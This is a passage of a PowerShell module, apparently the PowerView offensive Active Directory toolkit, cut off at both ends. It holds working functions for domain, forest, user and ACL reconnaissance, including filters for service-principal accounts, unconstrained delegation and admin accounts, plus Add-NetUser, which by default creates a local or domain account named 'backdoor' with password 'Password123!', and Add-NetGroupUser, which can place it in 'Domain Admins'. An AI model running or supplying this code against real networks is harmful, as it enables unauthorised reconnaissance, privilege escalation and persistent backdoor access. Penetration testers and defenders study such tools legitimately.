    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        $Value,

        [Switch]
        $ShowAll
    )

    begin {
        # values from https://support.microsoft.com/en-us/kb/305144
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    process {

        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if($Value -is [Int]) {
            $IntValue = $Value
        }
        elseif ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $IntValue = $Value.useraccountcontrol
            }
        }
        else {
            Write-Warning "Invalid object input for -Value : $Value"
            return $Null 
        }

        if($ShowAll) {
            foreach ($UACValue in $UACValues.GetEnumerator()) {
                if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            foreach ($UACValue in $UACValues.GetEnumerator()) {
                if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


filter Get-Proxy {
<#
    .SYNOPSIS
    
        Enumerates the proxy server and WPAD conents for the current user.
    .PARAMETER ComputerName
        The computername to enumerate proxy settings on, defaults to local host.
    .EXAMPLE
        PS C:\> Get-Proxy 
        
        Returns the current proxy settings.
#>
    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )

    try {
        $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)
        $RegKey = $Reg.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
        $ProxyServer = $RegKey.GetValue('ProxyServer')
        $AutoConfigURL = $RegKey.GetValue('AutoConfigURL')

        $Wpad = ""
        if($AutoConfigURL -and ($AutoConfigURL -ne "")) {
            try {
                $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)
            }
            catch {
                Write-Warning "Error connecting to AutoConfigURL : $AutoConfigURL"
            }
        }
        
        if($ProxyServer -or $AutoConfigUrl) {

            $Properties = @{
                'ProxyServer' = $ProxyServer
                'AutoConfigURL' = $AutoConfigURL
                'Wpad' = $Wpad
            }
            
            New-Object -TypeName PSObject -Property $Properties
        }
        else {
            Write-Warning "No proxy settings found for $ComputerName"
        }
    }
    catch {
        Write-Warning "Error enumerating proxy settings for $ComputerName : $_"
    }
}


function Get-PathAcl {
<#
    .SYNOPSIS
    
        Enumerates the ACL for a given file path.
    .PARAMETER Path
        The local/remote path to enumerate the ACLs for.
    .PARAMETER Recurse
        
        If any ACL results are groups, recurse and retrieve user membership.
    .EXAMPLE
        PS C:\> Get-PathAcl "\\SERVER\Share\" 
        
        Returns ACLs for the given UNC share.
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $Path,

        [Switch]
        $Recurse
    )

    begin {

        function Convert-FileRight {

            # From http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights

            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )

            $AccessMask = @{
              [uint32]'0x80000000' = 'GenericRead'
              [uint32]'0x40000000' = 'GenericWrite'
              [uint32]'0x20000000' = 'GenericExecute'
              [uint32]'0x10000000' = 'GenericAll'
              [uint32]'0x02000000' = 'MaximumAllowed'
              [uint32]'0x01000000' = 'AccessSystemSecurity'
              [uint32]'0x00100000' = 'Synchronize'
              [uint32]'0x00080000' = 'WriteOwner'
              [uint32]'0x00040000' = 'WriteDAC'
              [uint32]'0x00020000' = 'ReadControl'
              [uint32]'0x00010000' = 'Delete'
              [uint32]'0x00000100' = 'WriteAttributes'
              [uint32]'0x00000080' = 'ReadAttributes'
              [uint32]'0x00000040' = 'DeleteChild'
              [uint32]'0x00000020' = 'Execute/Traverse'
              [uint32]'0x00000010' = 'WriteExtendedAttributes'
              [uint32]'0x00000008' = 'ReadExtendedAttributes'
              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
              [uint32]'0x00000002' = 'WriteData/AddFile'
              [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
              [uint32]'0x1f01ff' = 'FullControl'
              [uint32]'0x0301bf' = 'Modify'
              [uint32]'0x0200a9' = 'ReadAndExecute'
              [uint32]'0x02019f' = 'ReadAndWrite'
              [uint32]'0x020089' = 'Read'
              [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()

            # get simple permission
            $Permissions += $SimplePermissions.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            # get remaining extended permissions
            $Permissions += $AccessMask.Keys |
                            ? { $FSR -band $_ } |
                            % { $AccessMask[$_] }

            ($Permissions | ?{$_}) -join ","
        }
    }

    process {

        try {
            $ACL = Get-Acl -Path $Path

            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {

                $Names = @()
                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                    $Object = Get-ADObject -SID $_.IdentityReference
                    $Names = @()
                    $SIDs = @($Object.objectsid)

                    if ($Recurse -and (@('268435456','268435457','536870912','536870913') -contains $Object.samAccountType)) {
                        $SIDs += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }

                    $SIDs | ForEach-Object {
                        $Names += ,@($_, (Convert-SidToName $_))
                    }
                }
                else {
                    $Names += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                }

                ForEach($Name in $Names) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $Path
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name[1]
                    $Out | Add-Member Noteproperty 'IdentitySID' $Name[0]
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}


filter Get-NameField {
<#
    .SYNOPSIS
    
        Helper that attempts to extract appropriate field names from
        passed computer objects.
    .PARAMETER Object
        The passed object to extract name fields from.
    .PARAMETER DnsHostName
        
        A DnsHostName to extract through ValueFromPipelineByPropertyName.
    .PARAMETER Name
        
        A Name to extract through ValueFromPipelineByPropertyName.
    .EXAMPLE
        PS C:\> Get-NetComputer -FullData | Get-NameField
#>
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Object]
        $Object,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $DnsHostName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $Name
    )

    if($PSBoundParameters['DnsHostName']) {
        $DnsHostName
    }
    elseif($PSBoundParameters['Name']) {
        $Name
    }
    elseif($Object) {
        if ( [bool]($Object.PSobject.Properties.name -match "dnshostname") ) {
            # objects from Get-NetComputer
            $Object.dnshostname
        }
        elseif ( [bool]($Object.PSobject.Properties.name -match "name") ) {
            # objects from Get-NetDomainController
            $Object.name
        }
        else {
            # strings and catch alls
            $Object
        }
    }
    else {
        return $Null
    }
}


function Convert-LDAPProperty {
<#
    .SYNOPSIS
    
        Helper that converts specific LDAP property result fields.
        Used by several of the Get-Net* function.
    .PARAMETER Properties
        Properties object to extract out LDAP fields for display.
#>
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {
            # convert the SID to a string
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {
            # convert the GUID to a string
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {
            # convert timestamps
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # if we have a System.__ComObject
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            # try to convert misc com objects
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}



########################################################
#
# Domain info functions below.
#
########################################################

filter Get-DomainSearcher {
<#
    .SYNOPSIS
        Helper used by various functions that takes an ADSpath and
        domain specifier and builds the correct ADSI searcher object.
    .PARAMETER Domain
        The domain to use for the query, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER ADSprefix
        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-DomainSearcher -Domain testlab.local
    .EXAMPLE
        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
#>

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if(!$Credential) {
        if(!$Domain){
            $Domain = (Get-NetDomain).name
        }
        elseif(!$DomainController) {
            try {
                # if there's no -DomainController specified, try to pull the primary DC
                #   to reflect queries through
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
            }
        }
    }
    elseif (!$DomainController) {
        try {
            $DomainController = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
        }
        catch {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }

        if(!$DomainController) {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
    }

    $SearchString = "LDAP://"

    if($DomainController) {
        $SearchString += $DomainController
        if($Domain){
            $SearchString += "/"
        }
    }

    if($ADSprefix) {
        $SearchString += $ADSprefix + ","
    }

    if($ADSpath) {
        if($ADSpath -like "GC://*") {
            # if we're searching the global catalog
            $DN = $AdsPath
            $SearchString = ""
        }
        else {
            if($ADSpath -like "LDAP://*") {
                if($ADSpath -match "LDAP://.+/.+") {
                    $SearchString = ""
                }
                else {
                    $ADSpath = $ADSpath.Substring(7)
                }
            }
            $DN = $ADSpath
        }
    }
    else {
        if($Domain -and ($Domain.Trim() -ne "")) {
            $DN = "DC=$($Domain.Replace('.', ',DC='))"
        }
    }

    $SearchString += $DN
    Write-Verbose "Get-DomainSearcher search string: $SearchString"

    if($Credential) {
        Write-Verbose "Using alternate credentials for LDAP connection"
        $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
    }
    else {
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    }

    $Searcher.PageSize = $PageSize
    $Searcher
}


filter Get-NetDomain {
<#
    .SYNOPSIS
        Returns a given domain object.
    .PARAMETER Domain
        The domain name to query for, defaults to the current domain.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetDomain -Domain testlab.local
    .EXAMPLE
        PS C:\> "testlab.local" | Get-NetDomain
    .LINK
        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Credential) {
        
        Write-Verbose "Using alternate credentials for Get-NetDomain"

        if(!$Domain) {
            # if no domain is supplied, extract the logon domain from the PSCredential passed
            $Domain = $Credential.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$Domain' from -Credential"
        }
   
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Warning "The specified domain does '$Domain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($Domain) {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Warning "The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}


filter Get-NetForest {
<#
    .SYNOPSIS
        Returns a given forest object.
    .PARAMETER Forest
        The forest name to query for, defaults to the current domain.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
    
        PS C:\> Get-NetForest -Forest external.domain
    .EXAMPLE
    
        PS C:\> "external.domain" | Get-NetForest
#>

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Credential) {
        
        Write-Verbose "Using alternate credentials for Get-NetForest"

        if(!$Forest) {
            # if no domain is supplied, extract the logon domain from the PSCredential passed
            $Forest = $Credential.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$Forest' from -Credential"
        }
   
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        
        try {
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch {
            Write-Warning "The specified forest '$Forest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($Forest) {
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
        try {
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch {
            Write-Warning "The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust."
            return $Null
        }
    }
    else {
        # otherwise use the current forest
        $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }

    if($ForestObject) {
        # get the SID of the forest root
        $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
        $Parts = $ForestSid -Split "-"
        $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
        $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
        $ForestObject
    }
}


filter Get-NetForestDomain {
<#
    .SYNOPSIS
        Return all domains for a given forest.
    .PARAMETER Forest
        The forest name to query domain for.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetForestDomain
    .EXAMPLE
        PS C:\> Get-NetForestDomain -Forest external.local
#>

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        $Credential
    )

    $ForestObject = Get-NetForest -Forest $Forest -Credential $Credential

    if($ForestObject) {
        $ForestObject.Domains
    }
}


filter Get-NetForestCatalog {
<#
    .SYNOPSIS
        Return all global catalogs for a given forest.
    .PARAMETER Forest
        The forest name to query domain for.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetForestCatalog
#>
    
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        $Credential
    )

    $ForestObject = Get-NetForest -Forest $Forest -Credential $Credential

    if($ForestObject) {
        $ForestObject.FindAllGlobalCatalogs()
    }
}


filter Get-NetDomainController {
<#
    .SYNOPSIS
        Return the current domain controllers for the active domain.
    .PARAMETER Domain
        The domain to query for domain controllers, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER LDAP
        Switch. Use LDAP queries to determine the domain controllers.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetDomainController -Domain 'test.local'
        
        Determine the domain controllers for 'test.local'.
    .EXAMPLE
        PS C:\> Get-NetDomainController -Domain 'test.local' -LDAP
        Determine the domain controllers for 'test.local' using LDAP queries.
    .EXAMPLE
        PS C:\> 'test.local' | Get-NetDomainController
        Determine the domain controllers for 'test.local'.
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($LDAP -or $DomainController) {
        # filter string to return all domain controllers
        Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    else {
        $FoundDomain = Get-NetDomain -Domain $Domain -Credential $Credential
        if($FoundDomain) {
            $Founddomain.DomainControllers
        }
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-NetUser {
<#
    .SYNOPSIS
        Query information for a given user or users in the domain
        using ADSI and LDAP. Another -Domain can be specified to
        query for users across a trust.
        Replacement for "net users /domain"
    .PARAMETER UserName
        Username filter string, wildcards accepted.
    .PARAMETER Domain
        The domain to query for users, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
    .PARAMETER AdminCount
        Switch. Return users with adminCount=1.
    .PARAMETER SPN
        Switch. Only return user objects with non-null service principal names.
    .PARAMETER Unconstrained
        Switch. Return users that have unconstrained delegation.
    .PARAMETER AllowDelegation
        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetUser -Domain testing
    .EXAMPLE
        PS C:\> Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
#>

    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    }

    process {
        if($UserSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            # check if we're using a username filter or not
            if($UserName) {
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                # filter is something like "(samAccountName=*blah*)" if specified
                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }

            $UserSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert/process the LDAP fields for each result
                Convert-LDAPProperty -Properties $_.Properties
            }
        }
    }
}


function Add-NetUser {
<#
    .SYNOPSIS
        Adds a domain user or a local user to the current (or remote) machine,
        if permissions allow, utilizing the WinNT service provider and
        DirectoryServices.AccountManagement, respectively.
        
        The default behavior is to add a user to the local machine.
        An optional group name to add the user to can be specified.
    .PARAMETER UserName
        The username to add. If not given, it defaults to 'backdoor'
    .PARAMETER Password
        The password to set for the added user. If not given, it defaults to 'Password123!'
    .PARAMETER GroupName
        Group to optionally add the user to.
    .PARAMETER ComputerName
        Hostname to add the local user to, defaults to 'localhost'
    .PARAMETER Domain
        Specified domain to add the user to.
    .EXAMPLE
        PS C:\> Add-NetUser -UserName john -Password 'Password123!'
        
        Adds a localuser 'john' to the local machine with password of 'Password123!'
    .EXAMPLE
        PS C:\> Add-NetUser -UserName john -Password 'Password123!' -ComputerName server.testlab.local
        
        Adds a localuser 'john' with password of 'Password123!' to server.testlab.local's local Administrators group.
    .EXAMPLE
        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain ''
        
        Adds the user "john" with password "password" to the current domain and adds
        the user to the domain group "Domain Admins"
    .EXAMPLE
        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain 'testing'
        
        Adds the user "john" with password "password" to the 'testing' domain and adds
        the user to the domain group "Domain Admins"
    .Link
        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'backdoor',

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )

    if ($Domain) {

        $DomainObject = Get-NetDomain -Domain $Domain
        if(-not $DomainObject) {
            Write-Warning "Error in grabbing $Domain object"
            return $Null
        }

        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
        # get the domain context
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $DomainObject

        # create the user object
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $Context

        # set user properties
        $User.Name = $UserName
        $User.SamAccountName = $UserName
        $User.PasswordNotRequired = $False
        $User.SetPassword($Password)
        $User.Enabled = $True

        Write-Verbose "Creating user $UserName to with password '$Password' in domain $Domain"

        try {
            # commit the user
            $User.Save()
            "[*] User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else {
        
        Write-Verbose "Creating user $UserName to with password '$Password' on $ComputerName"

        # if it's not a domain add, it's a local machine add
        $ObjOu = [ADSI]"WinNT://$ComputerName"
        $ObjUser = $ObjOu.Create('User', $UserName)
        $ObjUser.SetPassword($Password)

        # commit the changes to the local machine
        try {
            $Null = $ObjUser.SetInfo()
            "[*] User $UserName successfully created on host $ComputerName"
        }
        catch {
            Write-Warning '[!] Account already exists!'
            return
        }
    }

    # if a group is specified, invoke Add-NetGroupUser and return its value
    if ($GroupName) {
        # if we're adding the user to a domain
        if ($Domain) {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
        }
        # otherwise, we're adding to a local group
        else {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            "[*] User $UserName successfully added to group $GroupName on host $ComputerName"
        }
    }
}


function Add-NetGroupUser {
<#
    .SYNOPSIS
        Adds a user to a domain group or a local group on the current (or remote) machine,
        if permissions allow, utilizing the WinNT service provider and
        DirectoryServices.AccountManagement, respectively.
    .PARAMETER UserName
        The domain username to query for.
    .PARAMETER GroupName
        Group to add the user to.
    .PARAMETER ComputerName
        Hostname to add the user to, defaults to localhost.
    .PARAMETER Domain
        Domain to add the user to.
    .EXAMPLE
        PS C:\> Add-NetGroupUser -UserName john -GroupName Administrators
        
        Adds a localuser "john" to the local group "Administrators"
    .EXAMPLE
        PS C:\> Add-NetGroupUser -UserName john -GroupName "Domain Admins" -Domain dev.local
        
        Adds the existing user "john" to the domain group "Domain Admins" in "dev.local"
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,

        [String]
        $Domain
    )

    # add the assembly if we need it
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # if we're adding to a remote host's local group, use the WinNT provider
    if($ComputerName -and ($ComputerName -ne "localhost")) {
        try {
            Write-Verbose "Adding user $UserName to $GroupName on host $ComputerName"
            ([ADSI]"WinNT://$ComputerName/$GroupName,group").add("WinNT://$ComputerName/$UserName,user")
            "[*] User $UserName successfully added to group $GroupName on $ComputerName"
        }
        catch {
            Write-Warning "[!] Error adding user $UserName to group $GroupName on $ComputerName"
            return
        }
    }

    # otherwise it's a local machine or domain add
    else {
        try {
            if ($Domain) {
                Write-Verbose "Adding user $UserName to $GroupName on domain $Domain"
                $CT = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $DomainObject = Get-NetDomain -Domain $Domain
                if(-not $DomainObject) {
                    return $Null
                }
                # get the full principal context
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $CT, $DomainObject            
            }
            else {
                # otherwise, get the local machine context
                Write-Verbose "Adding user $UserName to $GroupName on localhost"
                $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }

            # find the particular group
            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)

            # add the particular user to the group
            $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

            # commit the changes
            $Group.Save()
        }
        catch {
            Write-Warning "Error adding $UserName to $GroupName : $_"
        }
    }
}


function Get-UserProperty {
<#
